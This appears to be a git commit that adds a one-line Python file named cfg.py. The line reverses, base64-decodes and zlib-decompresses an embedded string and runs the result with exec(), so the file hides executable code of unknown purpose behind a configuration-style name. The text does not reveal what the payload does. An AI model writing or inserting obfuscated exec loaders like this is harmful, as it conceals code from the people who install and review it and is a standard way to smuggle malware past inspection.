ba9428dad7176cdac8ba7ca360d9ffab3c46ea71
Joel Silva <53149347+zoreu@users.noreply.github.com>
2023-06-21 21:38:43 -0300

    Create cfg.py

---
+++ cfg.py
@@ -0,0 +1,1 @@
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'3bhoZAABUfdVKdvKqwKyqKvzPBtDM4KN2zASt6wKzxgCs+KSuYPDKDTMtgk919sDLbDcL2sNUrCL3xCcOTdCxcnUIR91ICt1NhUrLxJe'))
